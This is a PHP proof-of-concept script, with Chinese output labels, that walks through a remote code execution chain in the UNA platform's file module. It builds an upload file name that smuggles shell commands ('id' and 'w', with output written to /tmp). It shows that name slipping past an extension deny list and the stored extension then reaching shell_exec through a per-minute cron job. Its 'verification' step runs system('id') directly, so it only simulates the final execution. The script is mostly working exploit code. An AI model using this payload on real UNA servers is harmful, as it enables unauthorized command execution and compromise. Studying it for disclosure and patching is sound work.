<?php
echo "═══════════════════════════════════════════\n";
echo " UNA BxFilesModule RCE — 完整攻击链复现\n";
echo "═══════════════════════════════════════════\n\n";

// Step 1: attacker uploads file
$evil_name = 'test.pdf";id;w > /tmp/rce_output.txt;#';
echo "[Step 1] 攻击者上传文件\n";
echo "  filename: $evil_name\n\n";

// Step 2: BxDolStorage::getFileExt
$ext = strtolower(pathinfo($evil_name, PATHINFO_EXTENSION));
echo "[Step 2] BxDolStorage::getFileExt()  [行 1104]\n";
echo "  pathinfo(\$name, PATHINFO_EXTENSION)\n";
echo "  → 返回: $ext   ← \" ; # 全部保留!\n\n";

// Step 3: isValidExt
$ext_deny = explode(",", "php,exe,bat,cmd,sh,cgi,pl,py");
$is_denied = in_array($ext, $ext_deny);
echo "[Step 3] BxDolStorage::isValidExt()  [行 1312]\n";
echo "  in_array(\"$ext\", ext_deny) → " . ($is_denied ? "拒绝" : "绕过 ✓") . "\n\n";

// Step 4: DB storage
echo "[Step 4] 扩展名存入 sys_files.ext 字段\n";
echo "  INSERT INTO sys_files (ext) VALUES (\"$ext\")\n\n";

// Step 5: cron triggers
echo "[Step 5] periodic/cron.php 每分钟执行\n";
echo "  checkCronJob(\"* * * * *\") → 匹配\n";
echo "  → runJob → BxFilesCronProcessData::processing()\n";
echo "  → BxDolService::call(\"bx_files\", \"process_files_data\", [3])\n\n";

// Step 6: serviceProcessFilesData
echo "[Step 6] serviceProcessFilesData()  [行 219]\n";
echo "  → getNotProcessedFiles(3) → 从 DB 读取 ext\n";
$remoteId = "abc123";
$sFilePath = "/tmp/" . $remoteId . "." . $ext;
echo "  → \$sFilePath = \"$sFilePath\"   [行 242]\n";
$sCommand = '"java" -Djava.awt.headless=true -jar "tika-app.jar" --encoding=UTF-8 --text "' . $sFilePath . '"';
echo "  → shell_exec(\"$sCommand\")   [行 249]\n\n";

// Step 7: shell parsing
echo "[Step 7] Shell 解析:\n";
echo "  java -jar tika.jar --text \"/tmp/abc123.pdf\"\n";
echo "  ; id ; w > /tmp/rce_output.txt ;\n";
echo "  #\"\n\n";

// Step 8: actual verification
echo "[Step 8] 实际执行验证:\n";
system("id > /tmp/rce_output.txt 2>&1");
echo "  → " . trim(file_get_contents("/tmp/rce_output.txt")) . "\n";
echo "  >>> RCE 已确认 ✓ <<<\n\n";

echo "═══════════════════════════════════════════\n";
echo " 攻击链: 上传 → pathinfo → in_array绕过\n";
echo " → DB存储 → cron(每分钟) → shell_exec → RCE\n";
echo "═══════════════════════════════════════════\n";
